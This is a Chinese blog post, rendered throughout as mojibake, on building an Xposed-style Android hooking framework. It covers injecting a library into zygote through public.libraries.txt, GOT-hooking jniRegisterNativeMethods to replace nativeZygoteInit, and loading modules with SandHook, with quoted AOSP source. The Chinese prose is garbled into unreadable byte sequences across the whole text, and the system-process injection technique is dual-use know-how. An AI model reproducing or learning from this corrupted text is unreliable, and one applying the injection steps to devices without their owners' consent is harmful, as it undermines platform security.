å¤ªæé˜³é€šè¿‡ä¸€ç§æˆ‘çœ‹ä¸æ‡‚çš„é­”æ³•ï¼ˆçœ‹äº†ä¸€ä¸‹åªå‘ç°libjit.soï¼Œä½†weishuè¡¨ç¤ºAndroidç³»ç»Ÿé‡Œå¹¶æ²¡æœ‰ä¸€ä¸ªè¿™æ ·ä¸€ä¸ªåº“ï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯ç®€å•æ›¿æ¢soï¼‰æ³¨å…¥è¿›zygoteï¼ˆä»¥å‰æ˜¯æ›¿æ¢libprocessgroup.soï¼‰å¯ä»¥çœ‹å‡ºï¼Œå…¶ä»–æ¡†æ¶å‡ ä¹éƒ½é€šè¿‡ç›´æ¥æ›¿æ¢ç³»ç»Ÿå·²æœ‰çš„soåº“å®ç°ï¼Œè€Œæ›¿æ¢å·²æœ‰soåº“åˆ™éœ€è¦å°½é‡é€‰æ‹©è¾ƒè½»çš„åº“ï¼Œä»¥é¿å…å‚å•†çš„ä¿®æ”¹å¯¼è‡´çš„é—®é¢˜ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬æ²¡æ³•é¿å…å‚å•†åœ¨soé‡ŒåŠ æ–™ï¼Œå¦‚æœå‚å•†ä¿®æ”¹äº†è¿™ä¸ªsoåº“ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠæˆ‘ä»¬è‡ªå·±ä»¥AOSPä¸ºè“æœ¬å†™çš„soæ›¿æ¢ä¸Šå»ï¼Œåˆ™ä¼šå¯¼è‡´ä¸¥é‡çš„é—®é¢˜ã€‚æœ‰æ²¡æœ‰åˆ«çš„ä»€ä¹ˆåŠæ³•ï¼Ÿä¸‹é¢ä»‹ç»æ¢¦å¢ƒçš„å®ç°æ–¹å¼ã€‚ï¼ˆæ³¨ï¼šå¦‚æ— ç‰¹åˆ«è¯´æ˜ï¼Œæœ¬æ–‡ä¸­çš„AOSPæºç éƒ½æ˜¯ 7.0.0_r36 å¯¹åº”çš„ä»£ç ï¼‰æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨androidä¸­ï¼Œæ‰€æœ‰çš„åº”ç”¨è¿›ç¨‹éƒ½æ˜¯ç”±zygoteè¿›ç¨‹forkå‡ºæ¥çš„ï¼Œè€Œzygoteå¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶å°±æ˜¯app_processï¼ˆå…·ä½“å¯ä»¥çœ‹init.rcï¼‰app_processçš„mainæ–¹æ³•å¦‚ä¸‹ï¼š12345678910111213141516int main(int argc, char* const argv[])&#123; // çœç•¥æ— å…³ä»£ç ... AppRuntime runtime(argv[0], computeArgBlockSize(argc, argv)); // çœç•¥æ— å…³ä»£ç ... if (zygote) &#123; runtime.start(\"com.android.internal.os.ZygoteInit\", args, zygote); &#125; else if (className) &#123; runtime.start(\"com.android.internal.os.RuntimeInit\", args, zygote); &#125; else &#123; fprintf(stderr, \"Error: no class name or --zygote supplied.\\n\"); app_usage(); LOG_ALWAYS_FATAL(\"app_process: no class name or --zygote supplied.\"); return 10; &#125;&#125;å¯ä»¥å‘ç°ï¼Œæ˜¯é€šè¿‡AppRuntimeå¯åŠ¨çš„ï¼Œè€ŒAppRuntimeç»§æ‰¿è‡ªAndroidRuntimeï¼Œstartæ–¹æ³•çš„å®ç°åœ¨AndroidRuntimeé‡Œ1234567891011121314151617181920212223242526272829/* * Start the Android runtime. This involves starting the virtual machine * and calling the \"static void main(String[] args)\" method in the class * named by \"className\". * * Passes the main function two arguments, the class name and the specified * options string. */void AndroidRuntime::start(const char* className, const Vector&lt;String8&gt;&amp; options, bool zygote)&#123; // çœç•¥æ— å…³ä»£ç ... /* start the virtual machine */ JniInvocation jni_invocation; jni_invocation.Init(NULL); JNIEnv* env; if (startVm(&amp;mJavaVM, &amp;env, zygote) != 0) &#123; return; &#125; onVmCreated(env); /* * Register android functions. */ if (startReg(env) &lt; 0) &#123; ALOGE(\"Unable to register all android natives\\n\"); return; &#125; // çœç•¥æ— å…³ä»£ç ...&#125;æ³¨æ„startVmè¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬ç‚¹è¿›å»çœ‹çœ‹ã€‚1234567891011121314151617181920212223242526272829303132/* * Start the Dalvik Virtual Machine. * * Various arguments, most determined by system properties, are passed in. * The \"mOptions\" vector is updated. * * CAUTION: when adding options in here, be careful not to put the * char buffer inside a nested scope. Adding the buffer to the * options using mOptions.add() does not copy the buffer, so if the * buffer goes out of scope the option may be overwritten. It's best * to put the buffer at the top of the function so that it is more * unlikely that someone will surround it in a scope at a later time * and thus introduce a bug. * * Returns 0 on success. */int AndroidRuntime::startVm(JavaVM** pJavaVM, JNIEnv** pEnv, bool zygote)&#123; // çœç•¥æ— å…³ä»£ç ... /* * Initialize the VM. * * The JavaVM* is essentially per-process, and the JNIEnv* is per-thread. * If this call succeeds, the VM is ready, and we can start issuing * JNI calls. */ if (JNI_CreateJavaVM(pJavaVM, pEnv, &amp;initArgs) &lt; 0) &#123; ALOGE(\"JNI_CreateJavaVM failed\\n\"); return -1; &#125; return 0;&#125;æ¥ä¸‹æ¥çœ‹JNI_CreateJavaVMæ–¹æ³•ï¼š123456789101112131415161718192021222324252627282930313233343536// JNI Invocation interface.extern \"C\" jint JNI_CreateJavaVM(JavaVM** p_vm, JNIEnv** p_env, void* vm_args) &#123; ScopedTrace trace(__FUNCTION__); const JavaVMInitArgs* args = static_cast&lt;JavaVMInitArgs*&gt;(vm_args); if (IsBadJniVersion(args-&gt;version)) &#123; LOG(ERROR) &lt;&lt; \"Bad JNI version passed to CreateJavaVM: \" &lt;&lt; args-&gt;version; return JNI_EVERSION; &#125; RuntimeOptions options; for (int i = 0; i &lt; args-&gt;nOptions; ++i) &#123; JavaVMOption* option = &amp;args-&gt;options[i]; options.push_back(std::make_pair(std::string(option-&gt;optionString), option-&gt;extraInfo)); &#125; bool ignore_unrecognized = args-&gt;ignoreUnrecognized; if (!Runtime::Create(options, ignore_unrecognized)) &#123; return JNI_ERR; &#125; // Initialize native loader. This step makes sure we have // everything set up before we start using JNI. android::InitializeNativeLoader(); Runtime* runtime = Runtime::Current(); bool started = runtime-&gt;Start(); if (!started) &#123; delete Thread::Current()-&gt;GetJniEnv(); delete runtime-&gt;GetJavaVM(); LOG(WARNING) &lt;&lt; \"CreateJavaVM failed\"; return JNI_ERR; &#125; *p_env = Thread::Current()-&gt;GetJniEnv(); *p_vm = runtime-&gt;GetJavaVM(); return JNI_OK;&#125;è¿™ä¸ªå‡½æ•°ä¸é•¿ï¼Œæˆ‘å°±ç›´æ¥å…¨éƒ¨è´´å‡ºæ¥äº†ã€‚æ³¨æ„çœ‹android::InitializeNativeLoader()ï¼Œè¿™ä¸ªå‡½æ•°ç›´æ¥è°ƒç”¨äº†g_namespaces-&gt;Initialize()ï¼Œè€Œg_namespacesæ˜¯ä¸€ä¸ªLibraryNamespacesæŒ‡é’ˆï¼Œç»§ç»­çœ‹ä¸‹å»ï¼Œæˆ‘ä»¬å‘ç°äº†å®è—ï¼š123456789101112131415161718192021222324252627282930void Initialize() &#123; std::vector&lt;std::string&gt; sonames; const char* android_root_env = getenv(\"ANDROID_ROOT\"); std::string root_dir = android_root_env != nullptr ? android_root_env : \"/system\"; std::string public_native_libraries_system_config = root_dir + kPublicNativeLibrariesSystemConfigPathFromRoot; LOG_ALWAYS_FATAL_IF(!ReadConfig(public_native_libraries_system_config, &amp;sonames), \"Error reading public native library list from \\\"%s\\\": %s\", public_native_libraries_system_config.c_str(), strerror(errno)); // çœç•¥æ— å…³ä»£ç  // This file is optional, quietly ignore if the file does not exist. ReadConfig(kPublicNativeLibrariesVendorConfig, &amp;sonames); // android_init_namespaces() expects all the public libraries // to be loaded so that they can be found by soname alone. // // TODO(dimitry): this is a bit misleading since we do not know // if the vendor public library is going to be opened from /vendor/lib // we might as well end up loading them from /system/lib // For now we rely on CTS test to catch things like this but // it should probably be addressed in the future. for (const auto&amp; soname : sonames) &#123; dlopen(soname.c_str(), RTLD_NOW | RTLD_NODELETE); &#125; public_libraries_ = base::Join(sonames, ':');&#125;public_native_libraries_system_config=/system/etc/public.libraries.txtï¼Œè€ŒReadConfigæ–¹æ³•å¾ˆç®€å•ï¼Œè¯»å–ä¼ è¿›æ¥çš„æ–‡ä»¶è·¯å¾„ï¼ŒæŒ‰è¡Œåˆ†å‰²ï¼Œå¿½ç•¥ç©ºè¡Œå’Œä»¥#å¼€å¤´çš„è¡Œï¼Œç„¶åæŠŠè¿™è¡Œpush_backåˆ°ä¼ è¿›æ¥çš„vectoré‡Œã€‚æ‰€ä»¥è¿™ä¸ªå‡½æ•°åšäº†è¿™å‡ ä»¶äº‹ï¼šè¯»å–/system/etc/public.libraries.txtå’Œ/vendor/etc/public.libraries.txtæŒ¨ä¸ªdlopenè¿™ä¸¤ä¸ªtxtæ–‡ä»¶é‡Œæåˆ°çš„æ‰€æœ‰soåº“æ³¨ï¼šè¿™é‡Œåˆ†æçš„æºç æ˜¯7.0.0çš„ï¼Œåœ¨7.0å¾€åçš„æ‰€æœ‰ç‰ˆæœ¬ï¼ˆæˆªè‡³æœ¬æ–‡å‘å¸ƒï¼‰ä½ éƒ½èƒ½æ‰¾åˆ°ç±»ä¼¼çš„é€»è¾‘ã€‚çŸ¥é“äº†è¿™ä»¶äº‹æ³¨å…¥zygoteå°±å¥½åŠå¤šäº†å˜›ï¼åªè¦æŠŠæˆ‘ä»¬è‡ªå·±å†™çš„soåº“æ‰”åˆ°/system/libä¸‹é¢ï¼ˆ64ä½æ˜¯/syste/lib64ï¼‰ï¼Œç„¶ååœ¨/system/etc/public.libraries.txté‡ŒæŠŠæˆ‘ä»¬è‡ªå·±çš„æ–‡ä»¶åŠ ä¸Šå»ï¼Œè¿™æ ·zygoteå¯åŠ¨çš„æ—¶å€™å°±ä¼šå»åŠ è½½æˆ‘ä»¬çš„soåº“ï¼Œç„¶åæˆ‘ä»¬å†™ä¸€ä¸ªå‡½æ•°ï¼ŒåŠ ä¸Š__attribute__((constructor))ï¼Œè¿™æ ·è¿™ä¸ªå‡½æ•°å°±ä¼šåœ¨soåº“è¢«åŠ è½½çš„æ—¶å€™è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†æ³¨å…¥é€»è¾‘ï¼›è€Œä¸”è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œåªéœ€è¦è¿½åŠ ä¸€è¡Œæ–‡ä»¶åå°±è¡Œï¼Œå³ä½¿å‚å•†åšäº†ä¿®æ”¹ä¹Ÿä¸ç”¨æ‹…å¿ƒï¼Œç¨³å®šæ€§æ£’æ£’å“’ï¼ï¼ˆæ³¨1ï¼šæ­¤æ–¹æ³•æ˜¯æˆ‘çœ‹ä¸€ç¯‡åšå®¢æ—¶çœ‹è§çš„ï¼Œé‚£ç¯‡åšå®¢åæ§½â€œåœ¨public.libraries.txté‡ŒåŠ ä¸Šçš„soåº“ç«Ÿç„¶ä¼šåœ¨zygoteå¯åŠ¨æ—¶è¢«åŠ è½½ï¼Œæ¯æ¬¡ä¿®æ”¹éƒ½è¦é‡å¯æ‰‹æœºæ‰èƒ½ç”Ÿæ•ˆï¼Œå¤šä¸æ–¹ä¾¿è°ƒè¯•â€ï¼Œä½†æ˜¯ä»–æŠ±æ€¨çš„ç‰¹æ€§å´æˆä¸ºäº†æˆ‘çš„æ›™å…‰ï¼Œå¯æƒœæ‰¾ä¸åˆ°é‚£ç¯‡åšå®¢äº†ï¼Œæ²¡æ³•è´´å‡ºæ¥â€¦ï¼‰ï¼ˆæ³¨2ï¼šåœ¨æˆ‘å¤§è‡´å®Œæˆäº†æ ¸å¿ƒé€»è¾‘ä¹‹åï¼Œæˆ‘åœ¨EdXpçš„æºç é‡Œå‘ç°äº†è¿™ä¸ªæ–‡ä»¶ ï¼›è¿™ä¸ªéƒ¨åˆ†çœ‹èµ·æ¥æ˜¯ä½¿ç”¨whaleè¿›è¡Œjava hookçš„æ–¹æ¡ˆï¼Œä½†æ˜¯æˆ‘ä»æ¥æ²¡æœ‰å¬è¯´è¿‡æœ‰ä½¿ç”¨çº¯whaleè¿›è¡Œjava hookçš„EdXpç‰ˆæœ¬ï¼Œå¹¶ä¸”æˆ‘åœ¨install.shä¸­æ²¡æœ‰çœ‹è§æ“ä½œpublic.libraries.txtï¼Œæ‰€ä»¥ä¸å¤ªæ‡‚ä»–æƒ³ç”¨è¿™ä¸ªæ–‡ä»¶å¹²ä»€ä¹ˆ :( ï¼‰okï¼Œç°åœ¨æˆ‘ä»¬å®Œæˆäº†æ³¨å…¥zygoteè¿›ç¨‹çš„é€»è¾‘ï¼Œåˆšå®Œæˆçš„æ—¶å€™æˆ‘æƒ³ï¼Œå®Œæˆäº†æ³¨å…¥éƒ¨åˆ†ï¼ŒART Hookéƒ¨åˆ†ä¹Ÿæœ‰å¾ˆå¤šå¼€æºåº“ï¼Œé‚£ä¹ˆå®ç°ä¸€ä¸ªxposedä¸æ˜¯å¾ˆç®€å•çš„äº‹å—ï¼Ÿæœç„¶æˆ‘è¿˜æ˜¯å¤ªå¹´è½»â€¦ç›‘æ§åº”ç”¨è¿›ç¨‹å¯åŠ¨å‰é¢æˆ‘ä»¬æ³¨å…¥äº†zygoteè¿›ç¨‹ï¼Œç„¶è€Œè¿™æ ·è¿˜ä¸å¤Ÿï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç›‘æ§åº”ç”¨è¿›ç¨‹å¯åŠ¨å¹¶åœ¨åº”ç”¨è¿›ç¨‹æ‰§è¡Œä»£ç æ‰è¡Œã€‚åˆšå¼€å§‹æˆ‘çš„æƒ³æ³•å¾ˆç®€å•ï¼šç›´æ¥åœ¨zygoteé‡Œéšä¾¿ç”¨art hookæŠ€æœ¯hookæ‰å‡ ä¸ªjavaæ–¹æ³•ï¼›ä¸è¿‡åœ¨æˆ‘ä»¬çš„soåº“è¢«åŠ è½½çš„æ—¶å€™Runtimeè¿˜æ²¡å¯åŠ¨å®Œæˆï¼Œæ²¡æ³•æ‹¿åˆ°JNIEnvï¼ˆå°±ç®—æ‹¿åˆ°ä¹Ÿç”¨ä¸äº†ï¼‰ï¼Œè¿™ä¸ªä¹Ÿå¥½åŠï¼Œnative inline hookæ‰å‡ ä¸ªä¼šåœ¨Runtimeåˆå§‹åŒ–å®Œæˆæ—¶è°ƒç”¨çš„å‡½æ•°å°±è¡Œï¼Œç„¶å¹¶åµï¼Œæç¤ºæ— æ³•åˆ†é…å¯æ‰§è¡Œå†…å­˜ã€‚wtfï¼Ÿï¼Ÿä¸ºä»€ä¹ˆåˆ†é…å†…å­˜ä¼šå¤±è´¥ï¼Ÿå†…å­˜æ»¡äº†ï¼Ÿæ²¡å¯¹é½ï¼Ÿæœ€åç»ˆäºå‘ç°è¿™æ ·ä¸€æ¡logï¼štype=1400 audit(0.0:5): avc: denied { execmem } for scontext=u:r:zygote:s0 tcontext=u:r:zygote:s0 tclass=process permissive=0ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ï¼Œè¿™æ¡logä»£è¡¨zygoteè¿›ç¨‹çš„contextï¼ˆu:r:zygote:s0ï¼‰ä¸å…è®¸åˆ†é…å¯æ‰§è¡Œçš„åŒ¿åå†…å­˜ã€‚è¿™å°±éº»çƒ¦äº†å‘€ï¼Œå¾ˆå¤šäº‹éƒ½åšä¸äº†äº†ï¼ˆåŒ…æ‹¬javaæ–¹æ³•çš„inline hookï¼‰ï¼Œæƒ³è¿‡å¾ˆå¤šåŠæ³•ï¼ˆæ¯”å¦‚æ›¿æ¢sepolicyï¼‰ï¼Œæœ€åéƒ½è¢«æˆ‘å¦å†³äº†ã€‚é‚£æ€ä¹ˆåŠï¼Ÿæœ€åæ‰“ç®—å»çœ‹EdXpçš„å¤„ç†æ–¹å¼ï¼Œæ²¡çœ‹è§ä»»ä½•æœ‰å…³SELinuxçš„éƒ¨åˆ†ï¼Œä¼¼ä¹æ˜¯è®©magiskå¤„ç†ï¼Œä¸è¿‡æˆ‘çš„æ˜¯æ¨¡æ‹Ÿå™¨ï¼Œæ²¡æ³•è£…magiskã€‚è¿™ä¸ªé—®é¢˜å›°æ‰°äº†æˆ‘å¾ˆä¹…ï¼Œæœ€åï¼Œåœ¨Riruçš„æºç é‡Œå‘ç°äº†å¦ä¸€ç§å®ç°æ–¹æ¡ˆï¼šé€šè¿‡GOT Hookæ‹¦æˆªjniRegisterNativeMethodsï¼Œç„¶åå°±å¯ä»¥æ›¿æ¢éƒ¨åˆ†å…³é”®JNIå‡½æ•°ã€‚ç®€å•æ¥è¯´ï¼Œå½“å‘ç”Ÿè·¨ELFçš„å‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šå».gotè¡¨é‡ŒæŸ¥è¿™ä¸ªå‡½æ•°çš„ç»å¯¹åœ°å€ï¼Œç„¶åå†è·³è½¬è¿‡å»ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ”¹è¿™ä¸ªè¡¨å°±èƒ½è¾¾åˆ°hookçš„ç›®çš„ï¼Œæ›´å¤šå®ç°ç»†èŠ‚å¯ä»¥çœ‹xhookçš„è¯´æ˜æ–‡æ¡£ã€‚è¿™ç§æ–¹å¼çš„å¥½å¤„æ˜¯ä¸éœ€è¦ç›´æ¥æ“ä½œå†…å­˜ä¸­çš„æŒ‡ä»¤ï¼Œä¸éœ€è¦å»æ‰‹åŠ¨åˆ†é…å¯æ‰§è¡Œå†…å­˜ï¼Œæ‰€ä»¥ä¸ä¼šå—åˆ°SELinuxçš„é™åˆ¶ï¼›ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå¦‚æœäººå®¶ä¸æŸ¥.gotè¡¨ï¼Œå°±æ— æ³•hookäº†ã€‚æ‰€ä»¥è¿™ç§æ–¹å¼ä¸€èˆ¬ç”¨äºhookç³»ç»Ÿå‡½æ•°ï¼Œæ¯”å¦‚æ¥è‡ªlibcçš„malloc, openç­‰å‡½æ•°ã€‚å¥½äº†ï¼ŒGOT Hookå¹¶ä¸æ˜¯é‡ç‚¹ï¼Œæ¥ä¸‹æ¥Riruä½¿ç”¨xhook hookäº†libandroid_runtime.soå¯¹jniRegisterNativeMethodsæ–¹æ³•ï¼ˆæ¥è‡ªlibnativehelper.soï¼‰çš„è°ƒç”¨ï¼Œè¿™æ ·å°±èƒ½æ‹¦æˆªä¸€éƒ¨åˆ†çš„JNIæ–¹æ³•è°ƒç”¨äº†ã€‚ä¸ºä»€ä¹ˆè¯´æ˜¯ä¸€éƒ¨åˆ†ï¼Ÿå› ä¸ºå¦ä¸€éƒ¨åˆ†JNIå‡½æ•°çš„å®ç°åœ¨libarté‡Œï¼Œè¿™ä¸€éƒ¨åˆ†å‡½æ•°ç›´æ¥é€šè¿‡env-&gt;RegisterNativeMethodså®Œæˆæ³¨å†Œï¼Œæ‰€ä»¥æ— æ³•hookã€‚ä¹‹åriruåœ¨è¢«æ›¿æ¢çš„jniRegisterNativeMethodsä¸­åŠ¨äº†ä¸€ç‚¹å°æ‰‹è„šï¼šå¦‚æœæ­£åœ¨æ³¨å†Œæ¥è‡ªZygoteç±»çš„JNIæ–¹æ³•ï¼Œé‚£ä¹ˆä¼šæŠŠnativeForkSystemServerå’ŒnativeForkAndSpecializeæ›¿æ¢æˆè‡ªå·±çš„å®ç°ï¼Œè¿™æ ·å°±èƒ½æ‹¦æˆªsystem_serverä¸åº”ç”¨è¿›ç¨‹çš„å¯åŠ¨äº†ï¼Riruçš„è¿™ä¸ªæ–¹æ¡ˆéå¸¸å¥½ï¼Œä½†æ˜¯è¿˜æœ‰ä¼˜åŒ–ç©ºé—´ï¼šnativeForkAndSpecializeè¿™ä¸ªå‡½æ•°åŸºæœ¬ä¸Šæ¯ä¸ªç‰ˆæœ¬éƒ½ä¼šå˜ç­¾åï¼Œè€Œä¸”å„ä¸ªå‚å•†ä¹Ÿä¼šåšä¿®æ”¹ï¼ŒRiruçš„åŠæ³•å¾ˆç®€å•ï¼šæ¯”å¯¹ç­¾åï¼Œå¦‚æœç­¾åä¸å¯¹é‚£ä¹ˆå°±ä¸ä¼šæ›¿æ¢ã€‚ä¸è¿‡ï¼Œå®é™…ä¸Šæˆ‘ä»¬å¹¶ä¸éœ€è¦é‚£ä¹ˆç²¾å¯†çš„ç›‘æ§è¿›ç¨‹å¯åŠ¨ï¼Œè®©æˆ‘ä»¬æ¥æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰å…¶ä»–çš„hookç‚¹ã€‚å¤§å®¶éƒ½çŸ¥é“çš„ï¼Œzygoteè¿›ç¨‹æœ€ç»ˆä¼šè¿›å…¥ZygoteInit.mainï¼Œåœ¨mainæ–¹æ³•é‡Œforkå‡ºsystem_serverï¼Œç„¶åè¿›å…¥æ­»å¾ªç¯æ¥æ”¶æ¥è‡ªAMSçš„è¯·æ±‚forkå‡ºæ–°è¿›ç¨‹ã€‚12345678910public static void main(String argv[]) &#123; // çœç•¥æ— å…³ä»£ç ... if (startSystemServer) &#123; startSystemServer(abiList, socketName); &#125; // çœç•¥æ— å…³ä»£ç ... Log.i(TAG, \"Accepting command socket connections\"); runSelectLoop(abiList); // çœç•¥æ— å…³ä»£ç ...&#125;åœ¨startSystemServeré‡Œä¼šforkå‡ºsystem_serverï¼ŒrunSelectLoopä¸­ä¼šè¿›å…¥æ­»å¾ªç¯ç­‰å¾…åˆ›å»ºè¿›ç¨‹è¯·æ±‚ï¼Œç„¶åforkå‡ºåº”ç”¨è¿›ç¨‹ã€‚12345678910111213141516171819202122/** * Prepare the arguments and fork for the system server process. */private static boolean startSystemServer(String abiList, String socketName) throws MethodAndArgsCaller, RuntimeException &#123; // çœç•¥æ— å…³ä»£ç ... /* Request to fork the system server process */ pid = Zygote.forkSystemServer( parsedArgs.uid, parsedArgs.gid, parsedArgs.gids, parsedArgs.debugFlags, null, parsedArgs.permittedCapabilities, parsedArgs.effectiveCapabilities); /* For child process */ if (pid == 0) &#123; // æ³¨ï¼šè¿”å›0ä»£è¡¨å­è¿›ç¨‹ if (hasSecondZygote(abiList)) &#123; waitForSecondaryZygote(socketName); &#125; handleSystemServerProcess(parsedArgs); &#125;&#125;ç‚¹è¿›å»handleSystemServerProcessé‡Œçœ‹çœ‹ï¼š12345678910111213141516171819202122/** * Finish remaining work for the newly forked system server process. */ private static void handleSystemServerProcess( ZygoteConnection.Arguments parsedArgs) throws ZygoteInit.MethodAndArgsCaller &#123; // çœç•¥æ— å…³ä»£ç ... if (parsedArgs.invokeWith != null) &#123; // èµ°ä¸è¿›å»ï¼Œçœç•¥ &#125; else &#123; ClassLoader cl = null; if (systemServerClasspath != null) &#123; cl = createSystemServerClassLoader(systemServerClasspath, parsedArgs.targetSdkVersion); Thread.currentThread().setContextClassLoader(cl); &#125; /* * Pass the remaining arguments to SystemServer. */ RuntimeInit.zygoteInit(parsedArgs.targetSdkVersion, parsedArgs.remainingArgs, cl); &#125; &#125;æœ€ç»ˆä¼šè¿›å…¥RuntimeInit.zygoteInitï¼ˆ7.xï¼Œå¯¹äº8.xä¸ä»¥ä¸Šåœ¨ZygoteInit.zygoteInitï¼‰ï¼Œè®°ä½è¿™ä¸€ç‚¹ç„¶åï¼Œåº”ç”¨è¿›ç¨‹çš„åˆ›å»ºæ˜¯åœ¨runSelectLoop()é‡Œï¼Œæœ€åä¼šé€šè¿‡ZygoteConnection.runOnceè¿›è¡Œå¤„ç†12345678910111213141516171819202122232425262728293031323334/** * Reads one start command from the command socket. If successful, * a child is forked and a &#123;@link ZygoteInit.MethodAndArgsCaller&#125; * exception is thrown in that child while in the parent process, * the method returns normally. On failure, the child is not * spawned and messages are printed to the log and stderr. Returns * a boolean status value indicating whether an end-of-file on the command * socket has been encountered. * * @return false if command socket should continue to be read from, or * true if an end-of-file has been encountered. * @throws ZygoteInit.MethodAndArgsCaller trampoline to invoke main() * method in child process */boolean runOnce() throws ZygoteInit.MethodAndArgsCaller &#123; //å¿½ç•¥æ— å…³ä»£ç  pid = Zygote.forkAndSpecialize(parsedArgs.uid, parsedArgs.gid, parsedArgs.gids, parsedArgs.debugFlags, rlimits, parsedArgs.mountExternal, parsedArgs.seInfo, parsedArgs.niceName, fdsToClose, parsedArgs.instructionSet, parsedArgs.appDataDir); // å¿½ç•¥æ— å…³ä»£ç  if (pid == 0) &#123; // å­è¿›ç¨‹ // in child IoUtils.closeQuietly(serverPipeFd); serverPipeFd = null; handleChildProc(parsedArgs, descriptors, childPipeFd, newStderr); // should never get here, the child is expected to either // throw ZygoteInit.MethodAndArgsCaller or exec(). return true; &#125; else &#123; // å¿½ç•¥ &#125;&#125;12345678910111213141516171819202122232425/** * Handles post-fork setup of child proc, closing sockets as appropriate, * reopen stdio as appropriate, and ultimately throwing MethodAndArgsCaller * if successful or returning if failed. * * @param parsedArgs non-null; zygote args * @param descriptors null-ok; new file descriptors for stdio if available. * @param pipeFd null-ok; pipe for communication back to Zygote. * @param newStderr null-ok; stream to use for stderr until stdio * is reopened. * * @throws ZygoteInit.MethodAndArgsCaller on success to * trampoline to code that invokes static main. */private void handleChildProc(Arguments parsedArgs, FileDescriptor[] descriptors, FileDescriptor pipeFd, PrintStream newStderr) throws ZygoteInit.MethodAndArgsCaller &#123; // å¿½ç•¥æ— å…³ä»£ç  if (parsedArgs.invokeWith != null) &#123; // èµ°ä¸è¿›å»ï¼Œçœç•¥ &#125; else &#123; RuntimeInit.zygoteInit(parsedArgs.targetSdkVersion, parsedArgs.remainingArgs, null /* classLoader */); &#125;&#125;æœ€åä¹Ÿæ˜¯é€šè¿‡RuntimeInit.zygoteInitï¼ˆ7.xï¼Œå¯¹äº8.xä¸ä»¥ä¸Šåœ¨ZygoteInit.zygoteInitï¼‰å®Œæˆã€‚ç‚¹è¿›å»çœ‹çœ‹æœ‰æ²¡æœ‰hookç‚¹ï¼š123456789101112131415161718192021222324/** * The main function called when started through the zygote process. This * could be unified with main(), if the native code in nativeFinishInit() * were rationalized with Zygote startup.&lt;p&gt; * * Current recognized args: * &lt;ul&gt; * &lt;li&gt; &lt;code&gt; [--] &amp;lt;start class name&amp;gt; &amp;lt;args&amp;gt; * &lt;/ul&gt; * * @param targetSdkVersion target SDK version * @param argv arg strings */public static final void zygoteInit(int targetSdkVersion, String[] argv, ClassLoader classLoader) throws ZygoteInit.MethodAndArgsCaller &#123; if (DEBUG) Slog.d(TAG, \"RuntimeInit: Starting application from zygote\"); Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, \"RuntimeInit\"); redirectLogStreams(); commonInit(); nativeZygoteInit(); applicationInit(targetSdkVersion, argv, classLoader);&#125;æ³¨æ„åˆ°é‚£ä¸ªnativeZygoteInitæ²¡æœ‰ï¼ï¼å¾ˆæ˜æ˜¾æ˜¯ä¸ªnativeæ–¹æ³•ï¼Œè€Œä¸”æ˜¯æˆ‘ä»¬å¯ä»¥hookåˆ°çš„nativeæ–¹æ³•ï¼ï¼è¿™æ ·å­æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨jniRegisterNativeMethodsé‡Œæ›¿æ¢æ‰è¿™ä¸ªæ–¹æ³•äº†ï¼è€Œä¸”è¿™ä¸ªæ–¹æ³•ä»7.0åˆ°10.0ä¹Ÿåªæœ‰è¿‡ä¸€æ¬¡æ”¹å˜ï¼šä»RuntimeInitæ¬åˆ°ZygoteInitï¼Œæ¯”nativeForkAndSpecializeç¨³å¾—å¤šã€‚ï¼ˆç„¶è€Œç°åœ¨çœ‹æ¥æŸäº›æ“ä½œè¿˜æ˜¯éœ€è¦æ¯”è¾ƒç²¾ç»†çš„ç›‘æ§çš„ï¼Œä»¥åå†æ”¹å§ï¼‰åŠ è½½Xposedæ¨¡å—è¿™ä¸€éƒ¨åˆ†å…¶å®æ˜¯æœ€ç®€å•çš„ï¼Œç›®å‰å·²ç»æœ‰å¾ˆå¤šå¼€æºçš„ART Hookåº“ï¼Œæ‹¿æ¥å°±èƒ½ç”¨ï¼Œéœ€è¦è‡ªå·±å†™çš„åœ°æ–¹ä¹Ÿä¸éœ€è¦è·Ÿå¤ªä¹…çš„ç³»ç»Ÿå‡½æ•°è°ƒç”¨ã€‚ç›®å‰æ˜¯é€‰æ‹©äº†SandHookä½œä¸ºæ ¸å¿ƒART Hookåº“ï¼Œä¸»è¦æ˜¯å·²ç»æä¾›å¥½äº†Xposed APIï¼Œå¾ˆæ–¹ä¾¿ã€‚ç„¶åæ˜¯æ¨¡å—ç®¡ç†ï¼Œå› 